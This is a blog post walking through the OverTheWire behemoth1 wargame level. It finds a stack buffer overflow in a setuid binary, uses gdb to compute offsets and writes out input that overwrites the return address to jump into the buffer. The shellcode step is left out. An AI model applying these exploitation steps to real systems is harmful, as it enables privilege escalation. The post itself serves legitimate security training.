---
layout: post
title: How to solve behemoth1 task
---

The tasks have been taken from [overthewire.org](http://overthewire.org/wargames/behemoth/).

Login into the warbox:

```
    $ ssh behemoth1@behemoth.labs.overthewire.org -p 2221
    with password you've obtained in behemoth0
```

Run and try to enter strings of various length:

```
    $ /behemoth/behemoth1
```

It's easy to find out that entering something longer than 75
symbols crashes the program. Congratulations, this is stack
overflow problem.

`012345678901234567890123456789012345678901234567890123456789012345678901234`

Let's take a look at the file. It has `suid` bit as most of
the problems from the suite. `readelf` or `objdump` would not
should you anything interesting.

```
    $ cat /behemoth/behemoth0
```

Ok, go for gdb with:

```
    $ gdb -ix /usr/local/gdbinit/gdbinit /behemoth/behemoth1
    gdb$ func
    gdb$ dis main
```

You will see a disassembled `main` listing. What is interesting
here, is that the function is very short and contains nothing but
immediate `puts` call responding with a failed authentication
right after the `gets` request for the password.

There is no password here. No password check. You have to exploit
stack overflow to gain access to the next flag. So here you go.

Set breakpoint at the last `leave` instruction, and calculate
size of the message for `ebp` and `eip` values on the stack.

```
    gdb$ b *0x0804847f
    gdb$ run < <(echo -ne "123123456789012345678901234567890123456789012345678901234567890123467890123\x00\x00\x00\x00\x00\x00\x00\x00")
    Breakpoint 1, 0x0804847f in main ()
    gdb$ hexdump $esp 7
```

Beginning of the buffer may be calculated following the instructions
in main or right from the hexdump:

```
    gdb$ p $ebp-0x60-0x8+0x1d
    $1 = (void *) 0xffffd56d
```

`eip` starts at

```
    gdb$ p $ebp+0x4
    $2 = (void *) 0xffffd5bc
```

Rerun program with `eip` replaced for the beginning of the buffer.

```
    gdb$ run < <(echo -ne "123123456789012345678901234567890123456789012345678901234567890123467890123\x00\x00\x00\x00\x6d\xd5\xff\xff")
    Breakpoint 1, 0x0804847f in main ()
    gdb$ n 2
    0xffffd56d in ?? ()
```

So, it works. We've got our process jumped right into the buffer.

Now, we need to load the input with a program to replace current
process with a `/bin/sh`.

...

Use obtained password to enter new a `/bin/sh`
shell and get a flag for the next warbox.

Links
===

- [Objdump - How to output text (eg ASCII strings) alongside assembly code?](https://reverseengineering.stackexchange.com/questions/14633/objdump-how-to-output-text-eg-ascii-strings-alongside-assembly-code)
- [convert a hex string to binary and send with netcat](https://unix.stackexchange.com/questions/82561/convert-a-hex-string-to-binary-and-send-with-netcat)
- [gdb - debugging with pipe](https://stackoverflow.com/questions/1456253/gdb-debugging-with-pipe?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa)
